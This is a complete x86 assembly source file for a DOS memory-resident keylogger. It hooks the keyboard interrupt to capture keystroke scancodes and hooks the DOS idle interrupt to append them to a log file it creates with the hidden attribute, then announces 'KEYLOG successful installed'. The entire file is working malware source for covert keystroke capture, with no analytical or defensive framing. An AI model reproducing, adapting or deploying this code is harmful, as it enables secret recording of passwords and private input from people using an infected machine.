.model tiny
.code
.386
org 100h
Start:
		jmp	real_start

magic		dw	0BABAh
logfile		db	's:\OLD_HW\logger.txt', 0      
handle		dw	0
buf		db	10 dup (?)
bufptr          dw	0
must_write	db	0


;IRQ1 - KEYBOARD DATA READY
new_09h:
		pushf
		pusha
		push	es                      
		push	ds
		push	cs                      
		pop	ds	;Remember segments

		cmp	bufptr, 5
		jae	call_old_09	;Check if buffer is overflown

		in	al, 60h                 

		cmp   	al, 39h  	;Don't remember Shift, Alt and Ctrl               
		ja    	call_old_09             
		cmp   	al, 2Ah
		je    	call_old_09
		cmp   	al, 36h                 
		je    	call_old_09

		push  	0
		pop   	es                      
		mov   	ah, byte ptr es:[417h]  
		test  	ah, 43h                 ;Check if both shifts and CapsLock pressed
		je    	pk1                     
 
		add   	al, 80h     	            
pk1:
		mov 	di, bufptr
      		mov   	buf[di], al             
      		inc   	di                      
      		mov   	bufptr, di
      		mov   	must_write, 1           
                                    
call_old_09:

		pop	ds
		pop	es
		popa
		popf
		jmp	dword ptr cs:[old_09_offset]	;Jump to old int09 handler

old_09_offset  dw ?
old_09_segment dw ?
 

;DOS IDLE INTERRUPT
new_28h:
		pushf                         
		pusha
		push  	es
		push  	ds
		push  	cs
		pop   	ds

		cmp   	must_write, 1
		jne   	call_old_28  
           
		cmp   	bufptr, 5              
		jb    	call_old_28             
 
		mov   	ax, 3d01h
		lea   	dx, logfile             
		int   	21h
                     
		jc    	call_old_28             
		mov   	handle, ax
		mov   	bx, ax                  
		mov   	ax, 4202h
		xor   	cx, cx
		xor   	dx, dx
		int   	21h
                     
		jc    	call_old_28
             
		mov   	ah, 40h
		mov   	bx, handle
		mov   	cx, bufptr
		lea   	dx, buf
		int   	21h                     
		jc    	call_old_28             

		mov   	ah, 3Eh
		mov   	bx, handle
		int   	21h                     
		jc    	call_old_28
 
		mov   	must_write, 0
		mov   	bufptr, 0

call_old_28:
		pop	ds
		pop   	es
		popa                          
		popf
		jmp	dword ptr cs:[old_28_offset]

old_28_offset  dw ?
old_28_segment dw ?
 

real_start:
		mov	ax, 3509h		;Get old int09h address
		int   	21h                     
 
		cmp   	word ptr es:magic, 0BABAh ;Check if has been installed
		je    	already_inst
 
		mov   	cs:old_09_offset, bx    ;Remember old int09h handler
		mov   	cs:old_09_segment, es
    
		mov   	ax, 2509h		;Set new int09h handler
		mov   	dx, offset new_09h       
		int   	21h

		mov   	ax, 3528h               ;Get old 28h handler
		int   	21h                     

		mov   	cs:old_28_offset, bx     
		mov   	cs:old_28_segment, es    

		mov   	ax, 2528h		;Set new 28h handler                
		mov   	dx, offset new_28h       
		int   	21h
 
		call  	create_log_file         
 
		mov   	dx, offset ok_installed   
		mov   	ah, 09h			
		int   	21h

		mov   	dx, offset real_start   ;TSR
		int   	27h                     




create_log_file:
		mov   	ax, 3D01h	;Try to open file
		lea   	dx, logfile
		int   	21h                     
		mov   	handle, ax              
		jnc   	clog4                   
 
clog3:
		mov	ah, 3Ch         ;Create new file if not opened
		mov	cx, 02h                 
		lea	dx, logfile
		int	21h
		mov	handle, ax
 
clog4:
		mov	bx, handle      ;Remember file handle
		mov	ah, 3Eh		;Close file
		int	21h
		ret 


already_inst:
		mov	dx, offset already_msg
		mov	ah, 09h
		int	21h
		jmp	exit
 

exit:
		int	20h
 
ok_installed	db 'KEYLOG successful installed$'
already_msg	db 'KEYLOG already installed$'

end	Start
